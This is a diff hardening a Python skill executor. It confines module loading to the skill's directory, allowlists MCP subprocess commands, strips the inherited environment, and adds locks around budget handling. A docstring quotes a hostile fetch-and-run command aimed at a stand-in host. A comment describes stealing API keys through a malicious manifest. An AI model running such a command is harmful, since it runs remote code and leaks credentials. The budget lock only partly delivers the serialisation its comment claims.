@@ -1,12 +1,38 @@
-"""Skill tool execution — runs Python and MCP tools with budget tracking."""
+"""Skill tool execution — runs Python and MCP tools with budget tracking.
+
+Security model for skill execution:
+
+- ``python`` tools resolve ``module`` to a ``.py`` file under the skill's own
+  directory via ``importlib.util.spec_from_file_location``. Dotted module
+  names like ``os`` or ``subprocess`` are NOT importable — modules must live
+  inside the skill. We never modify ``sys.path``.
+- ``function`` names must be public identifiers; dunder/underscore-prefixed
+  names are refused to block ``__import__`` / ``__class__.__subclasses__``
+  style escapes via tool arguments.
+- ``mcp`` tools require ``server_command`` to be on a per-skill allowlist
+  (built-in skills only — community skills must opt in explicitly via
+  ``DEEPR_SKILL_ALLOW_MCP_COMMANDS=*`` or a comma-list). We do NOT merge the
+  full host env into the subprocess; only env keys listed in ``server.env``
+  are passed through, with ``${VAR}`` substitution from ``os.environ``.
+- Concurrent calls into the same ``SkillExecutor`` instance are serialised
+  through an ``asyncio.Lock`` around budget check + deduction so two
+  parallel callers cannot both pass a budget check on stale state.
+
+These are last-line defences; the install path (``manager.install``) is the
+correct place to require signatures + interactive confirmation for
+non-built-in skills.
+"""
 
 from __future__ import annotations
 
 import asyncio
-import importlib
+import importlib.util
 import json
 import logging
 import os
+import re
+import sys
+from pathlib import Path
 from typing import Any
 
 from deepr.experts.skills.definition import SkillDefinition, SkillTool
@@ -21,6 +47,47 @@ _COST_TIER_ESTIMATES = {
     "high": 0.20,
 }
 
+# Public-identifier regex for skill ``function`` names. Blocks dunder
+# attribute escapes (``__import__``, ``__class__``) and underscore-prefixed
+# private members.
+_PYTHON_IDENTIFIER = re.compile(r"^[A-Za-z][A-Za-z0-9_]*$")
+
+# Default allowlist of subprocess executables that built-in skills may spawn
+# as MCP servers. Community skills installed without explicit allowlisting
+# may NOT spawn arbitrary subprocesses. Set
+# ``DEEPR_SKILL_ALLOW_MCP_COMMANDS=*`` to opt out (not recommended) or pass
+# a comma-separated list of paths/binaries to allow.
+_BUILTIN_MCP_COMMAND_ALLOWLIST: frozenset[str] = frozenset(
+    {
+        # Python interpreter for skill-bundled MCP servers
+        "python",
+        "python3",
+        sys.executable,
+        # Node-based MCP servers (npx-distributed)
+        "npx",
+        "node",
+    }
+)
+
+
+def _mcp_command_allowed(command: str) -> bool:
+    """Return True if ``command`` is allowed as an MCP server subprocess.
+
+    Honours ``DEEPR_SKILL_ALLOW_MCP_COMMANDS`` env var:
+    - unset / empty: only the built-in allowlist is permitted.
+    - ``*``: every command is allowed (opt-in, dangerous).
+    - comma-separated list: those commands are permitted in addition to
+      the built-in allowlist.
+    """
+    extra = os.environ.get("DEEPR_SKILL_ALLOW_MCP_COMMANDS", "").strip()
+    if extra == "*":
+        return True
+    allowed = set(_BUILTIN_MCP_COMMAND_ALLOWLIST)
+    if extra:
+        allowed |= {entry.strip() for entry in extra.split(",") if entry.strip()}
+    # Match either basename (``npx``) or absolute path entry.
+    return command in allowed or Path(command).name in allowed
+
 
 class MCPClientProxy:
     """Spawns an MCP server subprocess and sends tool calls via JSON-RPC stdio."""
@@ -28,7 +95,19 @@ class MCPClientProxy:
     def __init__(self, command: str, args: list[str], env: dict[str, str]):
         self._command = command
         self._args = args
-        self._env = {**os.environ, **self._resolve_env(env)}
+        # Do NOT blanket-merge os.environ into the child. Only pass the
+        # exact keys the manifest declared, with ${VAR} substitution from
+        # os.environ. A malicious manifest with command="/bin/sh" would
+        # otherwise inherit OPENAI_API_KEY, AWS_*, etc., and could
+        # exfiltrate them.
+        resolved = self._resolve_env(env)
+        # Provide the minimal env any subprocess needs to start: PATH so
+        # the executable can be located, and HOME/USERPROFILE for
+        # well-behaved tools that read config files. Skill yaml controls
+        # everything else.
+        minimal_keys = ("PATH", "HOME", "USERPROFILE", "SYSTEMROOT", "TEMP", "TMP", "LANG", "LC_ALL")
+        base = {k: os.environ[k] for k in minimal_keys if k in os.environ}
+        self._env = {**base, **resolved}
         self._process: asyncio.subprocess.Process | None = None
         self._request_id = 0
 
@@ -151,6 +230,11 @@ class SkillExecutor:
         self._budget_remaining = budget_remaining
         self._mcp_proxies: dict[str, MCPClientProxy] = {}
         self._tool_map: dict[str, SkillTool] = {t.name: t for t in skill.tools}
+        # Serialise budget check + deduction so two parallel ``execute_tool``
+        # callers can't both pass a check against the same stale value
+        # and produce a negative budget. Also guards ``_mcp_proxies``
+        # creation against duplicate-spawn races.
+        self._lock = asyncio.Lock()
 
     async def execute_tool(self, tool_name: str, arguments: dict) -> dict[str, Any]:
         """Route to Python or MCP execution. Check budget first.
@@ -162,14 +246,16 @@ class SkillExecutor:
         if not tool:
             return {"error": f"Unknown tool: {tool_name}", "cost": 0.0}
 
-        # Budget check
+        # Budget check inside the lock so a parallel caller cannot
+        # observe the same ``_budget_remaining`` snapshot.
         estimated_cost = _COST_TIER_ESTIMATES.get(tool.cost_tier, 0.0)
-        if estimated_cost > 0 and estimated_cost > self._budget_remaining:
-            return {
-                "error": "BUDGET_EXCEEDED",
-                "detail": f"Tool costs ~${estimated_cost:.2f} but only ${self._budget_remaining:.2f} remains",
-                "cost": 0.0,
-            }
+        async with self._lock:
+            if estimated_cost > 0 and estimated_cost > self._budget_remaining:
+                return {
+                    "error": "BUDGET_EXCEEDED",
+                    "detail": f"Tool costs ~${estimated_cost:.2f} but only ${self._budget_remaining:.2f} remains",
+                    "cost": 0.0,
+                }
 
         if tool.type == "python":
             result = await self._execute_python(tool, arguments)
@@ -178,26 +264,65 @@ class SkillExecutor:
         else:
             result = {"error": f"Unknown tool type: {tool.type}", "cost": 0.0}
 
-        # Deduct cost from remaining budget
-        cost = result.get("cost", 0.0)
-        self._budget_remaining -= cost
+        # Only charge cost for SUCCESSFUL executions. The previous
+        # implementation deducted the tier estimate even when the
+        # underlying call returned an ``error``, double-charging users
+        # for failed paid tool invocations.
+        if "error" in result:
+            result["cost"] = 0.0
+        async with self._lock:
+            self._budget_remaining -= float(result.get("cost", 0.0))
         return result
 
     async def _execute_python(self, tool: SkillTool, arguments: dict) -> dict[str, Any]:
-        """Import module and call function. Supports sync and async."""
+        """Import module and call function. Supports sync and async.
+
+        Security:
+        - ``tool.module`` must resolve to a ``.py`` file under the skill
+          directory. Dotted stdlib references (``os``, ``subprocess``)
+          and any path that escapes the skill dir are rejected; we do
+          NOT modify ``sys.path``.
+        - ``tool.function`` must be a public identifier. Dunder and
+          underscore-prefixed names are blocked.
+        """
         if not tool.module or not tool.function:
             return {"error": "Python tool missing module/function", "cost": 0.0}
 
+        if not _PYTHON_IDENTIFIER.match(tool.function):
+            return {
+                "error": f"Invalid function name {tool.function!r}: must be a public Python identifier",
+                "cost": 0.0,
+            }
+
+        # Resolve the module to a .py file under the skill directory.
+        skill_root = Path(self._skill.path).resolve()
+        relative = tool.module.replace(".", "/") + ".py"
+        # Reject absolute / parent-traversal module values up front.
+        if Path(tool.module).is_absolute() or ".." in Path(tool.module).parts:
+            return {"error": "Module path escapes skill directory", "cost": 0.0}
+        candidate = (skill_root / relative).resolve()
         try:
-            # Resolve module relative to skill path
-            import sys
+            candidate.relative_to(skill_root)
+        except ValueError:
+            return {"error": "Module path escapes skill directory", "cost": 0.0}
+        if not candidate.is_file():
+            return {"error": f"Module {tool.module} not found in skill", "cost": 0.0}
 
-            skill_dir = str(self._skill.path)
-            if skill_dir not in sys.path:
-                sys.path.insert(0, skill_dir)
+        # Build a unique module qualname so skills shipping a same-named
+        # ``tools.py`` cannot collide in ``sys.modules`` cache.
+        safe_skill = re.sub(r"[^A-Za-z0-9_]", "_", self._skill.name)
+        safe_module = re.sub(r"[^A-Za-z0-9_]", "_", tool.module)
+        qualname = f"_deepr_skill_{safe_skill}_{safe_module}"
 
-            mod = importlib.import_module(tool.module)
-            func = getattr(mod, tool.function)
+        try:
+            spec = importlib.util.spec_from_file_location(qualname, candidate)
+            if spec is None or spec.loader is None:
+                return {"error": "Failed to load skill module", "cost": 0.0}
+            mod = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+            func = getattr(mod, tool.function, None)
+            if not callable(func):
+                return {"error": f"{tool.module}.{tool.function} is not callable", "cost": 0.0}
 
             if asyncio.iscoroutinefunction(func):
                 result = await func(**arguments)
@@ -211,26 +336,51 @@ class SkillExecutor:
             return {"error": str(e), "cost": 0.0}
 
     async def _execute_mcp(self, tool: SkillTool, arguments: dict) -> dict[str, Any]:
-        """Spawn/reuse MCP server, proxy the call, handle timeout."""
+        """Spawn/reuse MCP server, proxy the call, handle timeout.
+
+        Enforces the subprocess command allowlist — community skills
+        cannot run ``/bin/sh -c curl evil|sh`` unless the operator
+        explicitly opted in via ``DEEPR_SKILL_ALLOW_MCP_COMMANDS``.
+        """
         if not tool.server_command:
             return {"error": "MCP tool missing server command", "cost": 0.0}
 
+        if not _mcp_command_allowed(tool.server_command):
+            logger.warning(
+                "Refusing to spawn MCP server %r for skill %s — not in allowlist; "
+                "set DEEPR_SKILL_ALLOW_MCP_COMMANDS to permit",
+                tool.server_command,
+                self._skill.name,
+            )
+            return {
+                "error": f"MCP server command {tool.server_command!r} is not allowed for this skill",
+                "cost": 0.0,
+            }
+
         proxy_key = f"{tool.server_command}:{' '.join(tool.server_args)}"
 
-        if proxy_key not in self._mcp_proxies:
-            self._mcp_proxies[proxy_key] = MCPClientProxy(
-                command=tool.server_command,
-                args=tool.server_args,
-                env=tool.server_env,
-            )
+        # Lock the proxy-spawn so concurrent invocations don't both create
+        # a fresh subprocess for the same key and leak one.
+        async with self._lock:
+            if proxy_key not in self._mcp_proxies:
+                self._mcp_proxies[proxy_key] = MCPClientProxy(
+                    command=tool.server_command,
+                    args=tool.server_args,
+                    env=tool.server_env,
+                )
 
         proxy = self._mcp_proxies[proxy_key]
         remote_name = tool.remote_tool_name or tool.name
 
         result = await proxy.call_tool(remote_name, arguments, timeout=tool.timeout_seconds)
 
-        cost = _COST_TIER_ESTIMATES.get(tool.cost_tier, 0.0)
-        result["cost"] = cost
+        # Only attach the tier-estimate cost when the call actually
+        # succeeded. ``execute_tool`` also enforces this, but tagging
+        # here makes intent explicit for any callers that bypass it.
+        if "error" in result:
+            result["cost"] = 0.0
+        else:
+            result["cost"] = _COST_TIER_ESTIMATES.get(tool.cost_tier, 0.0)
         return result
 
     async def cleanup(self):
